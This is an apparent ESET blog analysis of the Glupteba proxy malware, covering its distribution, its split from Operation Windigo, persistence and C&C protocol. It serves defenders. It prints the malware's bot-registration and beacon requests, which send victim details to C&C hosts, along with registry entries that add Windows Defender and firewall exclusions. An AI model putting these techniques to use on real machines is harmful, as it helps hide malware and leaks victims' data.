    <h1 class="page-headline">Glupteba is no longer part of Windigo</h1>    <p class="sub-title">Latest ESET research strongly suggests that Glupteba is no longer tied to the infamous Operation Windigo.</p>

    <div class="article-authors d-flex flex-wrap">  <div class="article-author d-flex">  <a href="/blog/en/our-experts/frederic-vachon/" title="Frédéric Vachon">   <picture>  <source srcset="https://web-assets.esetstatic.com/tn/-x45/blog/2017/07/Frederic_Vachon.jpg" media="(max-width: 768px)" />   <img class="author-image me-3"  src="https://web-assets.esetstatic.com/tn/-x45/blog/2017/07/Frederic_Vachon.jpg" alt="Frédéric Vachon"  /></picture>  </a>  <div class="author-text"><p><a href="/blog/en/our-experts/frederic-vachon/" title="Frédéric Vachon"><b>Frédéric Vachon</b></a></p></div></div> </div>

                    <div class="article-body">
    <p>Our recent research on <a href="https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/" target="_blank" rel="noopener">Linux/Ebury</a>, the core component of <a href="https://web-assets.esetstatic.com/blog/2014/03/operation_windigo.pdf" target="_blank" rel="noopener">Operation Windigo</a>, led us to look at other components in Windigo’s ecosystem to see if they are still active and part of the same operation. During this process, we took a look at Win32/Glupteba, an open proxy previously distributed by exploit kits deployed as part of Operation Windigo. The result of our latest analysis strongly suggests that Glupteba is no longer tied to Operation Windigo.</p>
<p>In this blog post, we share the results of our investigation. We provide information about the current distribution mechanisms of Glupteba, a short analysis of the network traffic going through the proxy, and we discuss the relationship between Glupteba and Windigo. Finally, we give a technical analysis of the current state of the Glupteba binary.</p>
<h2>Glupteba distribution over time</h2>
<h3>Brief history</h3>
<p>Over time, Glupteba is known to have used various distribution methods. ESET researchers have tracked the distribution of Glupteba for the last seven years. We’ll give a brief overview of its evolution.</p>
<p>Back in 2011, ESET researchers working on the infamous <a href="https://en.wikipedia.org/wiki/Alureon" target="_blank" rel="noopener">TDL-4 bootkit</a> discovered that, as explained in this <a href="https://www.welivesecurity.com/2011/03/02/tdl4-and-glubteba-piggyback-piggybugs/" target="_blank" rel="noopener">blogpost</a>, it was being used as a downloader to fetch additional malware. Glupteba was found to be one of many malware variants it installed. TDL-4 operators were most likely selling a distribution service on black markets.</p>
<p>Three years later, ESET’s investigation into Operation Windigo revealed that part of the attackers' infrastructure of compromised Linux servers was used to redirect a certain proportion of HTTP requests through trojanized instances of web servers (Apache httpd, lighttpd and nginx). Redirected requests would hit DNS servers under the control of Windigo’s operators, which resolved the A record to the IP address of the final redirection targets. These usually hosted exploit kits. Upon successful exploitation, Glupteba would be installed.</p>
<p>The ties between Windigo and Glupteba didn’t end there. Glupteba’s C&amp;C servers were also hosted on machines that were part of Windigo’s botnet. Furthermore, the sole purpose of Glupteba at the time was to relay spam jobs fetched from Windigo’s infrastructure. It is, however, hard to say if Glupteba was operated by the same individuals as the Windigo botnet or if it was some kind of service provided by Windigo’s operators reselling usage of their infrastructure.</p>
<h3>Current distribution scheme</h3>
<p>Once again, Glupteba’s distribution vector changed. It is not distributed via Windigo’s infrastructure anymore. Glupteba is now part of its own botnet and is distributed by MSIL/Adware.CsdiMonetize.AG, which is used to install many different malware families – suggesting a Pay-Per-Install scheme. In addition to installing Glupteba, we’ve seen it deploying Adware, Bitcoin mining agents and various PUAs (Potentially Unwanted Applications). MSIL/Adware.CsdiMonetize.AG doesn’t directly install Glupteba.AY; instead it downloads its dropper, which is responsible for registering the bot to its C&amp;C, adding exclusions to Windows Defender and the Windows firewall as well as setting the environment to install Glupteba.</p>
<p>The query to register the bot contains multiple pieces of information about the victim’s machine. Here’s an example of such a query:</p>
<p><span style="font-family: 'courier new', courier, monospace;">POST /bots/register HTTP/1.1</span><br />
<span style="font-family: 'courier new', courier, monospace;"> Host: burnandfire5.com</span><br />
<span style="font-family: 'courier new', courier, monospace;"> User-Agent: Go-http-client/1.1</span><br />
<span style="font-family: 'courier new', courier, monospace;"> Content-Length: 400</span><br />
<span style="font-family: 'courier new', courier, monospace;"> Content-Type: application/x-www-form-urlencoded</span><br />
<span style="font-family: 'courier new', courier, monospace;"> Accept-Encoding: gzip </span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Data[appname]=SolitaryBrook&amp;Data[arch]=32&amp;Data[av]=&amp;Data[build_number]=7601&amp;Data[compaign_id]=&amp;Data[cpu]=&lt;CPU_SPEC&gt;&amp;Data[defender]=1&amp;Data[exploited]=1&amp;Data[firewall]=1&amp;Data[gpu]=&lt;GPU_INFO&gt;&amp;Data[is_admin]=1&amp;Data[os]=&lt;OS_INFO&gt;&amp;Data[username]=&lt;USERNAME&gt;&amp;Data[version]=71</span></p>
<p>The Windows Registry value HKCU\Software\Microsoft\TestApp\UUID is also created. It is needed by Glupteba to execute successfully. This value’s data must not be empty.</p>
<p>Finally, the following registry entries are created to add exclusion rules to Windows Defender and the Windows Firewall:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\&lt;USERNAME&gt;\AppData\Roaming\EpicNet Inc\CloudNet = 0HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\cloudnet.exe = 0HKLM\SYSTEM\ControlSet001\services\SharedAccess\Parameters\FirewallPolicy\FirewallRules\{09E3DB75-DE77-4B2D-A351-C745D9A15617} = "v2.10|Action=Allow|Active=TRUE|Dir=In|App=C:\Users\&lt;USERNAME&gt;\AppData\Roaming\EpicNet Inc\CloudNet\cloudnet.exe"</span></p>
<p>According to ESET’s telemetry, Glupteba has been seen in 180 different countries since the beginning of 2017. Three countries jointly account for 25% of all detections – Ukraine, the Russian Federation and Turkey. <a href="#fig1" target="_blank" rel="noopener">Figure 1</a> shows the distribution per country of the detections we observed.</p>

<h2>Proxy usage analysis</h2>
<p>During ESET's research into Operation Windigo, Glupteba's sole purpose was to relay spam jobs to their final recipients. We wanted to see if the use of Glupteba has changed since then. During November 2017, we captured network traffic going through an infected node for a duration of four days. Note that we didn’t decrypt the HTTPS traffic, so our visibility was limited to non-encrypted network protocols. Our analysis showed that Glupteba is no longer limited to sending spam. It is now primarily used by various automated systems. While Glupteba’s operators might use the proxy, we do believe that the use of Glupteba is sold to third-party users as a proxy service. Here, we provide information about the most interesting traffic we observed.<br />
The first thing we noticed is that Glupteba is still used to relay spam messages to their final recipients. Here’s an example of a spam message:</p>

<h2>Discussing links with Windigo</h2>
<p>When we decided to revisit Glupteba, it was primarily because we wanted to see if it was still associated with Operation Windigo;  our analysis leads us to believe that the two are no longer affiliated. Let us provide the reasons for such conclusions.</p>
<p>The first thing we looked at is the C&amp;C servers used by Glupteba. Enumerating the IP addresses we found, none of them matched any previously known Ebury-compromised servers. Moreover, the new C&amp;C servers have a lot of ports open, while the previous ones had only one DNAT and one SNAT rule to reroute the traffic to the actual C&amp;C server. Having so many ports open on a compromised server would be very noisy, which is not the <em>modus operandi</em> of Windigo’s operators.</p>
<p>As documented in the Operation Windigo <a href="https://web-assets.esetstatic.com/blog/2014/03/operation_windigo.pdf" target="_blank" rel="noopener">whitepaper</a>, the client connecting to Glupteba used to send an HTTP GET request on port 25 to a machine compromised by Ebury before starting to send spam jobs. This is no longer the case: spam jobs go directly through the proxy without any kind of prologue. Also, the spam messages themselves don’t look like those we used to see during Operation Windigo, where the messages led to a dating website. While it could be argued that the current spam messages, trying to sell sexual enhancement pills to "get your lady to the climax", are a logical sequel to the previous one, we believe they are unrelated.</p>
<p>Finally, the distribution itself is not related to Windigo anymore. As mentioned previously, it is now distributed by MSIL/Adware.CsdiMonetize.AG.</p>
<p>For all these reasons, we believe that Glupteba is no longer linked with Operation Windigo.</p>
<h2>Technical analysis</h2>
<p>In this section, we provide a technical analysis of the samples of Glupteba we looked at during this research. The first thing we noticed is that the current samples don’t look like those we analyzed back in 2014. We believe Glupteba has been rewritten from scratch. Whereas Glupteba used to be a fairly small and simple program, nowadays it has become a huge and very complex C++ program. It used to have around 70 functions. Now, it has more than 3600 functions.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/blog/2018/03/func_count.png"><img class="wp-image-109267" src="https://web-assets.esetstatic.com/blog/2018/03/func_count.png" alt="Glupteba " width="650" height="550" /></a><p class="caption-text">Figure 2. Functions list comparison</p></div></p>
<p>Glupteba now statically links to the <a href="http://www.boost.org/" target="_blank" rel="noopener">Boost C++ libraries</a> as shown in <a href="#fig3" target="_blank" rel="noopener">Figure 3</a>. To communicate over sockets, it uses the Windows Sockets APIs WSASend and WSARecv instead of send and recv.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/blog/2018/03/boost.png"><img class="wp-image-109266" src="https://web-assets.esetstatic.com/blog/2018/03/boost.png" alt="Glupteba " width="650" height="107" /></a><p class="caption-text">Figure 3. Boost C++ library related strings</p></div></p>
<h3>Persistence</h3>
<p>Glupteba acquires persistence by adding an entry in the Run registry key. Thus, every time Windows boots up, Glupteba will be launched. Here’s the entry that is created:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CloudNet =  "%APPDATA%\EpicNet Inc\CloudNet\cloudnet.exe"</span></p>
<p>Other entare also created in the Windows Registry. The most interesting are the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Software\EpicNet Inc.\CloudNet\Value = "20180223"</span><br />
<span style="font-family: 'courier new', courier, monospace;"> HKCU\Software\EpicNet Inc.\CloudNet\GUID = "CDC0432A-0298-40B1-9A71-D61F94C013A7"</span></p>
<p>The GUID entry is set to the bot id that is created via a call to CoCreateGuid. As for the Value entry, it contains the PE timestamp of Glupteba’s binary.</p>
<h3>C&amp;C communication</h3>
<p>From a networking perspective, there are no significant changes between the samples we documented in our Operation Windigo paper and the current version. When launched, Glupteba sends the same beacon to its C&amp;C and the response contains the session and the port that Glupteba will connect to for retrieval of the proxying jobs. Refer to the earlier <a href="https://web-assets.esetstatic.com/blog/2014/03/operation_windigo.pdf" target="_blank" rel="noopener">whitepaper</a> for more information about the protocol.</p>
<p>Beacon sent to the C&amp;C:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET </span><br />
<span style="font-family: 'courier new', courier, monospace;"> /stat?uptime=100&amp;downlink=1111&amp;uplink=1111&amp;id=05AA812F&amp;statpass=bpass&amp;version=20171106&amp;features=30&amp;guid=68794E51-0DBC-4CF6-BD98-8B18FE3E0A18&amp;comment=20171106&amp;p=0&amp;s= HTTP/1.0</span></p>
<p>The C&amp;C servers are stored encrypted in the binary. Once decrypted, they look like this:</p>
<p><span style="font-family: 'courier new', courier, monospace;">'server-%s.sportpics[.]xyz:30,server-%s.kinosport[.]top:30,'</span></p>
<p>The number after the colon is the maximum range of the server numbers. In this case, '30' means that there are 30 domain names generated by formatting the domain string with numbers from 1 to 30. When contacting the C&amp;C server, one of those domains is randomly selected and the GUID of the compromised machine is prepended as a subdomain to the chosen server resulting in a domain like this:</p>
<p>Example of a C&amp;C server:</p>
<p><span style="font-family: 'courier new', courier, monospace;">68794E51-0DBC-4CF6-BD98-8B18FE3E0A18.server-1.sportpics[.]xyz</span></p>
<p>Glupteba also sends a second GET request to its C&amp;C server in order to update information about the victim’s machine specifications. Here’s what the request looks like:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET </span><br />
<span style="font-family: 'courier new', courier, monospace;"> /update.php?uid=&lt;BOT_ID&gt;&amp;version=&lt;VERSION&gt;&amp;OS=&lt;OS&gt;&amp;have_admin=1&amp;mys=&lt;C&amp;C_SERVERS&gt;&amp;build=&lt;PE_TIMESTAMP&gt;&amp;cpu=&lt;CPU&gt;&amp;video=&lt;VIDEO_CARD&gt;&amp;ram=&lt;GB_OF_RAM&gt; HTTP/1.0</span></p>
<h3>String encryption</h3>
<p>Glupteba’s strings are encrypted using a custom algorithm. The decryption process uses a 16-byte key and has three separate phases. The key is different for each build. During the first phase, the <a href="https://en.wikipedia.org/wiki/Mersenne_Twister" target="_blank" rel="noopener">Mersenne Twister</a> pseudorandom number generator (PRNG) is used. The algorithm is seeded with the first four bytes of the key. Then, each byte of the cipher is XORed with the next byte generated by the PRNG.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/blog/2018/03/phase1.png"><img class="wp-image-109268" src="https://web-assets.esetstatic.com/blog/2018/03/phase1.png" alt="Glupteba " width="650" height="415" /></a><p class="caption-text">Figure 4. Phase One of the decryption process</p></div></p>
<p>There are three different variants of the second phase. One uses the <a href="https://en.wikipedia.org/wiki/Rabbit_(cipher)" target="_blank" rel="noopener">Rabbit cipher</a>; another uses a second round of XOR operations similar to the one from the first phase, but with a different seed derived from the key. The only variant that is used in the samples we analyzed is the third one. It consists of an XOR loop with the key.</p>
<p>The third and final phase is another XOR loop with a value that is computed from the output of the second phase and some immediate values.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/blog/2018/03/phase3.png"><img class="wp-image-109269" src="https://web-assets.esetstatic.com/blog/2018/03/phase3.png" alt="" width="650" height="654" /></a><p class="caption-text">Figure 5. Phase Three of the decryption process</p></div></p>
<p>In our <a href="https://github.com/eset/malware-research/blob/master/glupteba" target="_blank" rel="noopener">GitHub repository</a>, we provide a script to decrypt all the strings. Since the Mersenne Twister PRNG implementation of Python varies a bit from the one used by Glupteba, we also provide a Python implementation of the PRNG. Make sure the directory where it is located is in your %PYTHONPATH% before launching the string decryption script. You can do so by running this command in IDA’s Python interpreter:</p>
<p><span style="font-family: 'courier new', courier, monospace;">sys.path.append(&lt;PATH_TO_SCRIPT&gt;)</span></p>
<h2>Conclusion</h2>
<p>The Glupteba operators persist in finding ways to distribute their malware despite the relentless efforts of the information security community to disrupt their operations. After the exposure of Operation Windigo, they just moved to other tactics to get their malware spread to computers all around the globe.</p>
<p>The complete rewriting of their tools and its current distribution shows that the individuals behind Glupteba are still very active. Such efforts suggest that the open proxy market must be a very lucrative one, and that we’re unlikely to witness the disappearance of Glupteba in the near future.</p>
